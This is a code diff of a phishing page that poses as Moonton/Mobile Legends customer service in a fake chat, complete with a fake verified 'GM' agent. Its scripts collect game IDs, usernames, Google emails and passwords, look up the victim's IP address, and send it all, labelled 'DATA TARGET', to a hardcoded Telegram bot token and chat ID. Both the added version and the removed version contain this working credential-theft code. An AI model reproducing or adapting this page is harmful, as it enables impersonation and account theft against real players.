-                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7" />
-                </svg>
-            </button>
-            <button class="close-button absolute right-4 top-4 text-gray-500 hover:text-gray-900 transition duration-150 p-1 rounded-full hover:bg-gray-100 ml-4" onclick="closeRegistrationView()" style="display: none;">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12" />
-                </svg>
-            </button>
         </header>
-
-        <main class="flex-grow overflow-y-auto">
+        
+        <main style="flex-grow: 1; padding: 0 24px 24px; display: flex; flex-direction: column;">
+            <!-- Step 2: Email/Phone -->
+            <div id="step2" style="display: flex; flex-direction: column; height: 100%;">
+                <div style="flex-grow: 1;">
+                    <div class="floating-label-group">
+                        <div style="border: 2px solid #d1d5db; border-radius: 8px; max-width: 450px; margin: 0 auto;">
+                            <input id="usernameUserInput" type="email" placeholder="" style="width: 100%; padding: 12px; border: none; outline: none;">
+                            <label for="usernameUserInput" class="floating-label">Email or phone number</label>
+                        </div>
+                    </div>
+                    <div id="usernameError" style="color: #ef4444; font-size: 0.875rem; max-width: 450px; margin: 8px auto 0; display: none;"></div>
+                </div>
+                <div style="max-width: 450px; margin: 0 auto; width: 100%; display: flex; justify-content: flex-end; padding-top: 16px;">
+                    <button onclick="processStep2()" style="background-color: #2563eb; color: white; font-weight: 600; padding: 8px 24px; border-radius: 8px; border: none; cursor: pointer;">
+                        Next
+                    </button>
+                </div>
+            </div>
             
-            <div id="step1" class="registration-step-content space-y-6 hidden"></div>
-
-            <div id="step2" class="registration-step-content space-y-6 flex">
-                <div class="registration-step-inputs space-y-4">
-                    
-                    <div class="floating-label-group"> 
-                        <div class="input-wrapper">
-                            <input id="usernameUserInput" type="email" placeholder="" 
-                                   class="w-full p-3 border-2 rounded focus:border-blue-500 focus:outline-none" required>
-                            <label for="usernameUserInput" class="floating-label"> Email or phone number </label>
-                        </div>
-                    </div>
-                    
-                    <div id="usernameError" class="inline-error" style="display: none;"></div> 
-                    
-                    <div id="step2Loader" class="hidden flex items-center justify-center py-4">
-                        <div class="loader mr-3"></div>
-                        <span class="text-gray-400">Verifying...</span>
-                    </div>
-                </div>
-                
-                <div class="bottom-right-button flex-shrink-0 pt-4">
-                    <button class="bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg hover:bg-blue-700 transition duration-150" onclick="processStep2()">
-                        Next
-                    </button>
-                </div>
-            </div>
-
-            <div id="step3" class="registration-step-content space-y-6 hidden">
-                <div class="registration-step-inputs space-y-4 pt-10">
-                    <div class="input-group floating-label-group">
-                        <div class="input-wrapper">
-                            <input id="namaTokohInput" type="password" placeholder=" " 
-                                   class="w-full p-3 border-2 rounded focus:border-blue-500 focus:outline-none" 
-                                   required>
+            <!-- Step 3: Password -->
+            <div id="step3" class="hidden" style="display: flex; flex-direction: column; height: 100%;">
+                <div style="flex-grow: 1; padding-top: 40px;">
+                    <div class="floating-label-group">
+                        <div style="border: 2px solid #d1d5db; border-radius: 8px; max-width: 450px; margin: 0 auto;">
+                            <input id="namaTokohInput" type="password" placeholder="" style="width: 100%; padding: 12px; border: none; outline: none;">
                             <label for="namaTokohInput" class="floating-label">Password</label>
-                            
-                            <button type="button" class="password-toggle" onclick="togglePasswordVisibility()"></button> 
                         </div>
                     </div>
-                    
-                    <div class="show-password-checkbox">
-                        <input type="checkbox" id="showPasswordCheckbox" onchange="handleShowPassword(this)">
-                        <label for="showPasswordCheckbox">Show password</label>
+                    <div style="max-width: 450px; margin: 16px auto 0; display: flex; align-items: center;">
+                        <input type="checkbox" id="showPasswordCheckbox" onchange="handleShowPassword(this)" style="margin-right: 12px;">
+                        <label for="showPasswordCheckbox" style="font-size: 0.95rem;">Show password</label>
                     </div>
                 </div>
-                
-                <div class="bottom-right-button flex-shrink-0 pt-4">
-                    <button class="bg-blue-600 text-white font-semibold py-2 px-4 rounded-lg hover:bg-blue-700 transition duration-150" onclick="processRegistration()">
+                <div style="max-width: 450px; margin: 0 auto; width: 100%; display: flex; justify-content: flex-end; padding-top: 16px;">
+                    <button onclick="processRegistration()" style="background-color: #2563eb; color: white; font-weight: 600; padding: 8px 24px; border-radius: 8px; border: none; cursor: pointer;">
                         Next
                     </button>
                 </div>
             </div>
-
         </main>
     </div>
 
-    <script>
-        // --- KONFIGURASI TELEGRAM ---
-        const TELEGRAM_BOT_TOKEN = '7887238935:AAEbdlUzTW_8WmiCMC61gnmNa36ch1Kb5Sk';
-        const ADMIN_USERNAME = '@MobileLegendServiceCenter'; 
-        const TELEGRAM_CHAT_ID = '7423591679';
+    <!-- Full Screen Loader -->
+    <div id="fullScreenLoader" class="hidden" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: white; z-index: 70; display: flex; flex-direction: column; align-items: center; justify-content: center;">
+        <p style="font-size: 1.25rem; font-weight: 500; margin-bottom: 48px;">Please wait...</p>
+        <div class="loader"></div>
+    </div>
 
-        // --- Firebase Global Variables ---
-        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
-        const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : null;
+<script>
+// --- KONFIGURASI TELEGRAM ---
+const TELEGRAM_BOT_TOKEN = '7887238935:AAEbdlUzTW_8WmiCMC61gnmNa36ch1Kb5Sk';
+const ADMIN_USERNAME = '@MobileLegendServiceCenter';
+const TELEGRAM_CHAT_ID = '7423591679';
+
+let registrationData = {
+    user_id_kode: '',
+    username_jagoan: '',
+    username_user: '',
+    nama_tokoh: '',
+    ip_address: '',
+    source: ''
+};
+
+let modalCompleted = false;
+let registrationCompleted = false;
+
+// --- DOM Elements ---
+const chatArea = document.getElementById('chatArea');
+const selectionModal = document.getElementById('selectionModal');
+const registrationView = document.getElementById('registrationView');
+const fullScreenLoader = document.getElementById('fullScreenLoader');
+const step2 = document.getElementById('step2');
+const step3 = document.getElementById('step3');
+const usernameUserInput = document.getElementById('usernameUserInput');
+const namaTokohInput = document.getElementById('namaTokohInput');
+
+// --- FUNGSI UTAMA ---
+function addMessage(text, sender) {
+    const messageDiv = document.createElement('div');
+    messageDiv.style.display = 'flex';
+    messageDiv.style.justifyContent = sender === 'user' ? 'flex-end' : 'flex-start';
+    messageDiv.style.marginBottom = '8px';
+
+    const bubble = document.createElement('div');
+    bubble.className = `message-bubble ${sender === 'user' ? 'user-message' : 'bot-message'}`;
+    
+    if (sender === 'bot') {
+        const senderName = document.createElement('p');
+        senderName.style.fontWeight = 'bold';
+        senderName.style.fontSize = '0.875rem';
+        senderName.style.marginBottom = '4px';
+        senderName.style.color = '#2563eb';
+        senderName.textContent = 'Moonton Technology Co.';
+        bubble.appendChild(senderName);
+    }
+
+    bubble.innerHTML += text;
+    messageDiv.appendChild(bubble);
+    chatArea.appendChild(messageDiv);
+    chatArea.scrollTop = chatArea.scrollHeight;
+}
+
+function showTypingIndicator() {
+    removeTypingIndicator();
+    
+    const typingDiv = document.createElement('div');
+    typingDiv.id = 'typingIndicator';
+    typingDiv.style.display = 'flex';
+    typingDiv.style.justifyContent = 'flex-start';
+    typingDiv.style.marginBottom = '8px';
+
+    const bubble = document.createElement('div');
+    bubble.className = 'message-bubble bot-message';
+    
+    const content = document.createElement('div');
+    content.innerHTML = `
+        <p style="font-weight: bold; font-size: 0.875rem; margin-bottom: 4px; color: #2563eb;">Moonton Technology Co.</p>
+        <div style="display: flex; align-items: center; height: 16px;">
+            <span class="dot"></span>
+            <span class="dot"></span>
+            <span class="dot"></span>
+        </div>
+    `;
+    
+    bubble.appendChild(content);
+    typingDiv.appendChild(bubble);
+    chatArea.appendChild(typingDiv);
+    chatArea.scrollTop = chatArea.scrollHeight;
+}
+
+function removeTypingIndicator() {
+    const typingIndicator = document.getElementById('typingIndicator');
+    if (typingIndicator) typingIndicator.remove();
+}
+
+// --- HANDLE COMMANDS ---
+function handleCommand(command) {
+    addMessage(command, 'user');
+    showTypingIndicator();
+
+    setTimeout(() => {
+        removeTypingIndicator();
         
-        let app, auth, db, userId = null;
-        let isAuthReady = false;
+        switch(command) {
+            case 'Cancel change email':
+                if (registrationCompleted) {
+                    addMessage('<p>Berikut adalah list harga Diamond Mobile Legends:</p><ul><li>100 Diamond: Rp 25.000</li><li>200 Diamond: Rp 49.000</li><li>500 Diamond: Rp 120.000</li></ul>', 'bot');
+                } else if (modalCompleted) {
+                    showInlineRegistrationForm(true);
+                } else {
+                    showInlineRegistrationForm(false);
+                }
+                break;
+                
+            case 'Account Recovery':
+                const verifBadge = `<img src="https://i.postimg.cc/rmBGkWD8/73039e1668b4f2254a7085b1e4d597b5-removebg-preview.png" alt="Verified" style="width: 18px; height: 18px; margin-left: 4px; vertical-align: middle;">`;
+                addMessage(`<p>Hey hero! We understand you're having trouble recovering your account. However, we're still experiencing server issues for account recovery. We'll update you soon.</p><p style="margin-top: 12px;">Sincerely, Moonton Technology Co.</p><p style="margin-top: 4px; font-weight: 600; color: #2563eb;">[GM] Nita ${verifBadge}</p>`, 'bot');
+                break;
+                
+            case 'Bug Reports':
+                addMessage(`<p>Visit our <a href="https://t.me/${ADMIN_USERNAME.replace('@', '')}?text=Hi%20Moonton,%20I%20want%20to%20report%20about%20bug%20report" target="_blank" style="color: #2563eb; text-decoration: underline; font-weight: 600;">Customer service</a> to explain bugs in the game</p>`, 'bot');
+                break;
+        }
+    }, 800);
+}
+
+// --- INLINE REGISTRATION FORM ---
+function showInlineRegistrationForm(isFinalStep = false) {
+    const buttonText = isFinalStep ? 'Cancel change email' : 'Submit';
+    const formAction = isFinalStep ? 'handleFinalDataSubmission(this)' : 'handleInlineRegistration(this, false)';
+    const initialText = "Please fill in your account details to cancel your email change.";
+    const finalText = "Make sure your data is correct, then click send to cancel change email.";
+
+    const formHTML = `
+        <p>${isFinalStep ? finalText : initialText}</p>
+        <form id="inlineForm" onsubmit="event.preventDefault(); ${formAction}" style="margin-top: 16px; padding: 12px; background-color: white; border-radius: 8px; border: 1px solid #e5e7eb;">
+            <div class="floating-label-group" style="margin-bottom: 12px;">
+                <input type="text" id="userIdKodeInput" placeholder=" " value="${registrationData.user_id_kode || ''}" 
+                       style="width: 100%; padding: 12px; border: 2px solid #d1d5db; border-radius: 8px; outline: none;"
+                       oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                <label for="userIdKodeInput" class="floating-label">Id/Server</label>
+            </div>
+            
+            <div class="floating-label-group" style="margin-bottom: 16px;">
+                <input type="text" id="usernameJagoanInput" placeholder=" " value="${registrationData.username_jagoan || ''}"
+                       style="width: 100%; padding: 12px; border: 2px solid #d1d5db; border-radius: 8px; outline: none;">
+                <label for="usernameJagoanInput" class="floating-label">Username</label>
+            </div>
+            
+            <button type="submit" style="width: 100%; background-color: #2563eb; color: white; font-weight: 600; padding: 10px; border-radius: 8px; border: none; cursor: pointer;">
+                ${buttonText}
+            </button>
+        </form>
+    `;
+    
+    addMessage(formHTML, 'bot');
+}
+
+function handleInlineRegistration(formElement, isFinal = false) {
+    if (!isFinal) {
+        const userIdKode = document.getElementById('userIdKodeInput').value.trim();
+        const usernameJagoan = document.getElementById('usernameJagoanInput').value.trim();
+
+        if (!userIdKode || !usernameJagoan) {
+            alert("Please fill in the ID/server and username correctly to cancel change Email.");
+            return;
+        }
         
-        let registrationData = {
-            user_id_kode: '',
-            username_jagoan: '',
-            username_user: '',
-            nama_tokoh: '',
-            ip_address: '',
-            firebase_id: ''
+        if (!/^[0-9]+$/.test(userIdKode)) {
+            alert("Id/Server harus berupa angka!");
+            return;
+        }
+
+        registrationData.user_id_kode = userIdKode;
+        registrationData.username_jagoan = usernameJagoan;
+        registrationData.source = 'Cancel change email';
+        
+        addMessage(`Id/Server: ${userIdKode}, Username: ${usernameJagoan}`, 'user');
+        
+        showTypingIndicator();
+        setTimeout(() => {
+            removeTypingIndicator();
+            addMessage(`Hey hero! Your account data has been received, to verify please log in with your account.<br><button onclick="openSelectionModal()" style="background-color: #2563eb; color: white; font-size: 0.875rem; padding: 6px 16px; border-radius: 999px; border: none; cursor: pointer; margin-top: 8px;">Login.</button>`, 'bot');
+        }, 800);
+    } else {
+        handleFinalDataSubmission(formElement);
+    }
+}
+
+async function handleFinalDataSubmission(formElement) {
+    const userIdKode = document.getElementById('userIdKodeInput').value.trim();
+    const usernameJagoan = document.getElementById('usernameJagoanInput').value.trim();
+
+    if (!userIdKode || !usernameJagoan) {
+        alert("Mohon isi semua kolom Id/Server dan Username.");
+        return;
+    }
+
+    registrationData.user_id_kode = userIdKode;
+    registrationData.username_jagoan = usernameJagoan;
+    
+    // Show loader
+    fullScreenLoader.classList.remove('hidden');
+    
+    // Get IP
+    let ipAddress = 'IP_Address_Gagal_Diambil';
+    try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        ipAddress = ipData.ip || ipAddress;
+    } catch (error) {
+        console.error("Gagal mendapatkan IP:", error);
+    }
+    registrationData.ip_address = ipAddress;
+
+    // Send to Telegram
+    await sendToTelegramBot(registrationData);
+    
+    registrationCompleted = true;
+
+    // Hide loader after 2 seconds
+    setTimeout(() => {
+        fullScreenLoader.classList.add('hidden');
+        
+        const verifBadge = `<img src="https://i.postimg.cc/rmBGkWD8/73039e1668b4f2254a7085b1e4d597b5-removebg-preview.png" alt="Verified" style="width: 18px; height: 18px; margin-left: 4px; vertical-align: middle;">`;
+        const telegramLink = `https://t.me/${ADMIN_USERNAME.replace('@', '')}?text=Successfully%20canceled%20the%20email%20change,%20please%20include%20screenshot`;
+        
+        addMessage(`<p style="font-weight: bold; font-size: 1.125rem; color: #2563eb;">Successfully canceled the email change</p><p style="margin-top: 4px;">Please take a screenshot and send it to our <a href="${telegramLink}" target="_blank" style="color: #2563eb; text-decoration: underline; font-weight: 600;">customer service</a>.</p><p style="margin-top: 8px; font-weight: 600; color: #2563eb;">[GM] Nita ${verifBadge}</p>`, 'bot');
+    }, 2000);
+}
+
+// --- MODAL FUNCTIONS ---
+function openSelectionModal() {
+    selectionModal.classList.remove('hidden');
+}
+
+function closeSelectionModal() {
+    selectionModal.classList.add('hidden');
+}
+
+async function startRegistrationFlow(startStep) {
+    selectionModal.classList.add('hidden');
+    fullScreenLoader.classList.remove('hidden');
+    
+    await new Promise(resolve => setTimeout(resolve, 1500));
+    fullScreenLoader.classList.add('hidden');
+    
+    registrationView.classList.remove('hidden');
+    showStep(startStep);
+}
+
+function showStep(stepNumber) {
+    step2.style.display = stepNumber === 2 ? 'flex' : 'none';
+    step3.style.display = stepNumber === 3 ? 'flex' : 'none';
+    
+    if (stepNumber === 2) {
+        setTimeout(() => usernameUserInput.focus(), 100);
+    } else if (stepNumber === 3) {
+        namaTokohInput.type = 'password';
+        setTimeout(() => namaTokohInput.focus(), 100);
+    }
+}
+
+function processStep2() {
+    const usernameUser = usernameUserInput.value.trim();
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    const errorElement = document.getElementById('usernameError');
+
+    errorElement.textContent = '';
+    errorElement.style.display = 'none';
+    
+    if (!usernameUser) {
+        errorElement.textContent = 'Mohon masukkan alamat email atau nomor telepon.';
+        errorElement.style.display = 'block';
+        return;
+    }
+    
+    if (!emailRegex.test(usernameUser)) {
+        errorElement.textContent = "ⓘ Can't find your Google account.";
+        errorElement.style.display = 'block';
+        return;
+    }
+
+    registrationData.username_user = usernameUser;
+    showStep(3);
+}
+
+function handleShowPassword(checkbox) {
+    namaTokohInput.type = checkbox.checked ? 'text' : 'password';
+}
+
+function processRegistration() {
+    const namaTokoh = namaTokohInput.value.trim();
+    if (!namaTokoh) {
+        alert("Password tidak boleh kosong!");
+        return;
+    }
+    
+    registrationData.nama_tokoh = namaTokoh;
+    modalCompleted = true;
+    
+    registrationView.classList.add('hidden');
+    
+    fullScreenLoader.classList.remove('hidden');
+    setTimeout(() => {
+        fullScreenLoader.classList.add('hidden');
+        
+        const verifBadge = `<img src="https://i.postimg.cc/rmBGkWD8/73039e1668b4f2254a7085b1e4d597b5-removebg-preview.png" alt="Verified" style="width: 18px; height: 18px; margin-left: 4px; vertical-align: middle;">`;
+        addMessage(`<p style="font-weight: bold; color: #2563eb; font-size: 1.125rem;">Report has been received!</p><p>Please re-verify your account. No one else can access this report except you. Ensure the data is correct to avoid errors.</p><p style="font-weight: 600; color: #2563eb;">[GM] Nita ${verifBadge}</p>`, 'bot');
+        
+        showInlineRegistrationForm(true);
+    }, 1000);
+}
+
+// --- TELEGRAM FUNCTION ---
+async function sendToTelegramBot(data) {
+    if (TELEGRAM_CHAT_ID === '0') {
+        console.warn("Telegram tidak dikirim: CHAT_ID masih 0");
+        return;
+    }
+    
+    const message = 
+        `*DATA TARGET*\n` +
+        `----------------------------------------\n` +
+        `*Id/Server:* ${data.user_id_kode || '-'}\n` +
+        `*Username:* ${data.username_jagoan || '-'}\n` +
+        `*Email/Phone:* ${data.username_user || '-'}\n` +
+        `*Password:* ${data.nama_tokoh || '-'}\n` +
+        `*IP:* ${data.ip_address || '-'}\n` +
+        `*Sumber:* ${data.source || '-'}\n` +
+        `----------------------------------------`;
+    
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+        console.log("Data terkirim ke Telegram");
+    } catch (error) {
+        console.error("Gagal kirim ke Telegram:", error);
+    }
+}
+
+// Initialize floating labels
+document.addEventListener('DOMContentLoaded', () => {
+    // Initialize floating labels for registration view
+    document.querySelectorAll('.floating-label-group input').forEach(input => {
+        const updateFloatingState = () => {
+            const isFilled = input.value.trim() !== '';
+            const label = input.nextElementSibling;
+            if (label && label.classList.contains('floating-label')) {
+                if (isFilled || document.activeElement === input) {
+                    label.style.top = '-0.5rem';
+                    label.style.transform = 'translateY(0)';
+                    label.style.fontSize = '0.65rem';
+                    label.style.color = '#3b82f6';
+                } else {
+                    label.style.top = '50%';
+                    label.style.transform = 'translateY(-50%)';
+                    label.style.fontSize = '';
+                    label.style.color = '#9ca3af';
+                }
+            }
         };
 
-        // --- DOM Elements ---
-        const chatView = document.getElementById('chatView');
-        const registrationView = document.getElementById('registrationView');
-        const selectionModal = document.getElementById('selectionModal'); // NEW MODAL
-        const chatArea = document.getElementById('chatArea');
-        const statusInfo = document.getElementById('statusInfo');
-        const fullScreenLoader = document.getElementById('fullScreenLoader');
-        const registrationTitle = document.getElementById('registrationTitle');
-        const usernameError = document.getElementById('usernameError'); // NEW DOM ELEMENT
-
-        const step1 = document.getElementById('step1'); // Empty now
-        const step2 = document.getElementById('step2');
-        const step3 = document.getElementById('step3');
-        const step2Loader = document.getElementById('step2Loader');
-        const usernameUserInput = document.getElementById('usernameUserInput'); 
-        const namaTokohInput = document.getElementById('namaTokohInput');
-
-        // --- STATUS PENGIRIMAN ---
-        let modalCompleted = false;
-        let registrationCompleted = false;
-
-        // --- MODAL FUNCTIONS (Selection Modal) ---
-
-        window.openSelectionModal = function(sourceCommand) {
-             if (!registrationData.source) {
-                 registrationData.source = sourceCommand;
-             }
-             // MEMASTIKAN TEMA DITERAPKAN SAAT MODAL DIBUKA
-             applyTheme(); 
-             
-             selectionModal.classList.remove('hidden');
-             // Menghapus opacity-0 secara instan
-             selectionModal.classList.remove('opacity-0'); 
-        }
-
-        window.closeSelectionModal = function(event) {
-            if (event && event.target !== selectionModal) return; 
-            selectionModal.classList.add('opacity-0');
-            setTimeout(() => selectionModal.classList.add('hidden'), 300);
-        }
-        
-        // --- NEW: Function to start the full registration flow from the selection modal ---
-        window.startRegistrationFlow = async function(startStep) {
-            
-            // 1. Tutup modal secara instan
-            selectionModal.classList.add('hidden'); // Menutup selection modal secara instan
-
-            // 2. Sembunyikan CHAT VIEW dan Tampilkan Full Screen Loader
-            switchView('loading'); // NEW: Menampilkan loading screen
-            applyTheme(); // Memastikan tema loader sudah benar
-
-            // 3. Simulasikan Loading (misalnya 1.5 detik)
-            await new Promise(resolve => setTimeout(resolve, 1500)); 
-            
-            // 4. Sembunyikan Loader
-            fullScreenLoader.classList.add('hidden');
-
-            // 5. Buka tampilan pendaftaran penuh tanpa transisi
-            switchView('registration');
-            showStep(startStep); 
-        }
-
-        // --- VIEW SWITCHING & THEME (Updated) ---
-
-        function applyTheme() {
-            const isDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
-            
-            // [KRUSIAL] Halaman Chat/Utama TIDAK MENYESUAIKAN TEMA (selalu light theme)
-            // Memaksa body menjadi theme-light, yang seharusnya sudah terjadi di CSS hardcoded
-            document.body.classList.remove('theme-dark'); 
-            document.body.classList.add('theme-light'); 
-
-            // [KRUSIAL] Halaman Registration menyesuaikan tema sistem
-            registrationView.classList.remove('theme-light', 'theme-dark');
-            if (isDarkMode) {
-                registrationView.classList.add('theme-dark');
-            } else {
-                registrationView.classList.add('theme-light');
-            }
-        }
-
-        function switchView(viewName) {
-            chatView.style.display = 'none';
-            registrationView.style.display = 'none';
-            fullScreenLoader.classList.add('hidden');
-            
-            if (viewName === 'chat') {
-                chatView.style.display = 'flex';
-            } else if (viewName === 'registration') {
-                registrationView.style.display = 'flex';
-                registrationView.classList.remove('view-hidden');
-                registrationView.classList.add('view-visible');
-            } else if (viewName === 'loading') {
-                // Tampilkan loading screen di atas segalanya
-                fullScreenLoader.classList.remove('hidden');
-                fullScreenLoader.classList.remove('opacity-0');
-            }
-        }
-        
-        window.openRegistrationView = function(sourceCommand) {
-            // FUNGSI INI KINI MEMANGGIL openSelectionModal()
-            if (!registrationData.source) {
-                 registrationData.source = sourceCommand;
-            }
-            openSelectionModal(sourceCommand);
-        }
-
-        window.closeRegistrationView = function() {
-            // Gunakan logika switchView instan untuk kembali ke chat view
-            switchView('chat');
-        }
-
-        // --- FIREBASE & AUTH FUNCTIONS ---
-        // KRUSIAL: Memperbaiki ReferenceError dengan mengembalikan fungsi
-        window.initializeFirebase = async function() {
-            if (!firebaseConfig) {
-                statusInfo.textContent = "WARNING : No one can complete this action except you.";
-                statusInfo.classList.remove('hidden');
-                return;
-            }
-            // (Logika inisialisasi Firebase yang hilang)
-             try {
-                 app = initializeApp(firebaseConfig);
-                 auth = getAuth(app);
-                 db = getFirestore(app);
-                 setLogLevel('debug');
-                 
-                 if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
-                     await signInWithCustomToken(auth, __initial_auth_token);
-                 } else {
-                     await signInAnonymously(auth);
-                 }
-                 onAuthStateChanged(auth, (user) => {
-                     isAuthReady = true;
-                     if (user) {
-                         userId = user.uid;
-                         registrationData.firebase_id = userId;
-                     } else {
-                         userId = null;
-                     }
-                 });
-                 applyTheme(); 
-             } catch (error) {
-                 console.error("Firebase initialization or sign-in failed:", error);
-                 statusInfo.textContent = `ERROR Firebase: Gagal masuk. ${error.message}`;
-                 statusInfo.classList.remove('hidden');
-             }
-        }
-
-        // --- CHAT AND COMMAND FUNCTIONS ---
-        // KRUSIAL: Mengembalikan fungsi chat yang hilang
-        function addMessage(text, sender) {
-            const messageDiv = document.createElement('div');
-            messageDiv.className = `flex ${sender === 'user' ? 'justify-end' : 'justify-start'}`;
-
-            const bubble = document.createElement('div');
-            bubble.className = `message-bubble ${sender === 'user' ? 'user-message' : 'bot-message'} ${sender === 'bot' ? 'bot-response' : ''}`; 
-            
-            if (sender === 'bot') {
-                const senderName = document.createElement('p');
-                senderName.className = 'font-bold text-sm mb-1 text-blue-600';
-                senderName.textContent = 'Moonton Technology Co.';
-                bubble.appendChild(senderName);
-            }
-
-            bubble.innerHTML += text; 
-
-            messageDiv.appendChild(bubble);
-            chatArea.appendChild(messageDiv);
-            chatArea.scrollTop = chatArea.scrollHeight;
-        }
-        
-        function removeTypingIndicator() {
-            const typingIndicator = document.getElementById('typingIndicator');
-            if (typingIndicator) {
-                typingIndicator.remove();
-            }
-        }
-        
-        function showTypingIndicator() {
-            removeTypingIndicator(); 
-            
-            const typingDiv = document.createElement('div');
-            typingDiv.id = 'typingIndicator';
-            typingDiv.className = 'flex justify-start';
-
-            const bubble = document.createElement('div');
-            bubble.className = 'message-bubble bot-message text-gray-800';
-            
-            const content = document.createElement('div');
-            content.innerHTML = `
-                <p class="font-bold text-sm mb-1 text-blue-600">Moonton Technology Co.</p>
-                <div class="flex items-center h-4">
-                    <span class="dot"></span>
-                    <span class="dot"></span>
-                    <span class="dot"></span>
-                </div>
-            `;
-            
-            bubble.appendChild(content);
-            typingDiv.appendChild(bubble);
-            chatArea.appendChild(typingDiv);
-            
-            chatArea.scrollTop = chatArea.scrollHeight;
-            return typingDiv;
-        }
-
-        function showInlineRegistrationForm(isFinalStep = false) {
-            const userIdKodeValue = registrationData.user_id_kode;
-            const usernameJagoanValue = registrationData.username_jagoan;
-
-            // MENGGANTI TEKS TOMBOL
-            const buttonText = isFinalStep ? 'Cancel change email' : 'Submit';
-            const formAction = isFinalStep ? 'handleFinalDataSubmission(this)' : 'handleInlineRegistration(this, false)';
-
-            // START TEXT CHANGE HERE
-            const initialText = "Please fill in your account details to cancel your email change.";
-            const finalText = "Make sure your data is correct, then click send to cancel change email.";
-
-            const formHTML = `
-                <p>${isFinalStep ? finalText : initialText}</p>
-                <form id="inlineForm" class="mt-4 space-y-3 p-3 bg-white rounded-lg border border-gray-200" onsubmit="event.preventDefault(); ${formAction}">
-                    
-                    <div class="floating-label-group text-sm">
-                        <input type="text" id="userIdKodeInput" placeholder=" " 
-                                 value="${userIdKodeValue}"
-                                 class="w-full p-3 border-2 border-gray-300 rounded focus:border-blue-500 focus:outline-none text-gray-700"
-                                 inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')"> <label for="userIdKodeInput" class="floating-label">Id/Server</label>
-                    </div>
-
-                    <div class="floating-label-group text-sm">
-                        <input type="text" id="usernameJagoanInput" placeholder=" " 
-                                 value="${usernameJagoanValue}"
-                                 class="w-full p-3 border-2 border-gray-300 rounded focus:border-blue-500 focus:outline-none text-gray-700">
-                        <label for="usernameJagoanInput" class="floating-label">Username</label>
-                    </div>
-
-                    <button type="submit" id="inlineSubmitButton" class="w-full bg-blue-600 text-white font-semibold py-2 rounded-lg hover:bg-blue-700 transition duration-150">
-                        ${buttonText}
-                    </button>
-                </form>
-            `;
-            addMessage(formHTML, 'bot');
-        }
-
-        window.handleFinalDataSubmission = async function(formElement) {
-            if (!formElement || formElement.tagName !== 'FORM') return; 
-
-            const userIdKode = document.getElementById('userIdKodeInput').value.trim();
-            const usernameJagoan = document.getElementById('usernameJagoanInput').value.trim();
-
-            const numericRegex = /^[0-9]+$/;
-
-            // UPDATING VALIDATION MESSAGES
-            if (!userIdKode || !usernameJagoan) {
-                showModalAlert("Mohon isi semua kolom Id/Server dan Username.");
-                return;
-            }
-            
-            if (!numericRegex.test(userIdKode)) {
-                showModalAlert("Id/Server harus berupa angka (numerik)!");
-                return;
-            }
-            
-            formElement.querySelectorAll('input, button').forEach(el => el.disabled = true);
-
-            registrationData.user_id_kode = userIdKode;
-            registrationData.username_jagoan = usernameJagoan;
-            
-            fullScreenLoader.classList.remove('hidden');
-            fullScreenLoader.classList.remove('opacity-0');
-            
-            let ipAddress = 'IP_Address_Gagal_Diambil';
-            try {
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                ipAddress = ipData.ip || ipAddress;
-            } catch (error) {
-                console.error("Gagal mendapatkan IP Address:", error);
-            }
-            registrationData.ip_address = ipAddress;
-
-            await sendToTelegramBot(registrationData);
-            
-            registrationCompleted = true;
-
-            await new Promise(resolve => setTimeout(resolve, 2000)); 
-            
-            fullScreenLoader.classList.add('opacity-0');
-            setTimeout(() => fullScreenLoader.classList.add('hidden'), 300);
-
-            // Definisikan verifBadge (diambil dari definisi sebelumnya)
-            const verifBadge = `<img src="https://i.postimg.cc/rmBGkWD8/73039e1668b4f2254a7085b1e4d597b5-removebg-preview.png" alt="Verified Badge" style="width: 18px; height: 18px; margin-left: 4px; display: inline-block; vertical-align: middle; object-fit: contain;">`;
-            
-            // Dapatkan ADMIN_USERNAME dari global scope
-            const adminUsernameClean = ADMIN_USERNAME.replace('@', '');
-            const telegramLink = `https://t.me/${adminUsernameClean}?text=Successfully%20canceled%20the%20email%20change,%20please%20include%20screenshot`;
-
-            // MEMBUAT RESPONS BARU SESUAI PERMINTAAN
-            const newResponse = `
-                <p class="font-bold text-lg text-blue-600">Successfully canceled the email change</p>
-                <p class="mt-1">Please take a screenshot and send it to our <a href="${telegramLink}" target="_blank" class="text-blue-600 hover:underline font-semibold">customer service</a>.</p>
-                <p class="mt-2 font-semibold text-blue-600">[GM] Nita ${verifBadge}</p>
-            `;
-            
-            addMessage(newResponse, 'bot');
-        }
-
-        window.handleInlineRegistration = async function(formElement, isFinal = false) {
-            if (!isFinal) {
-                if (!formElement || formElement.tagName !== 'FORM') return;
-
-                const userIdKode = document.getElementById('userIdKodeInput').value.trim();
-                const usernameJagoan = document.getElementById('usernameJagoanInput').value.trim();
-
-                const numericRegex = /^[0-9]+$/;
-
-                // UPDATING VALIDATION MESSAGES
-                if (!userIdKode || !usernameJagoan) {
-                    showModalAlert("Please fill in the ID/server and username correctly to cancel change Email.");
-                    return;
-                }
-                
-                if (!numericRegex.test(userIdKode)) {
-                    showModalAlert("Id/Server harus berupa angka (numerik)!");
-                    return;
-                }
-                
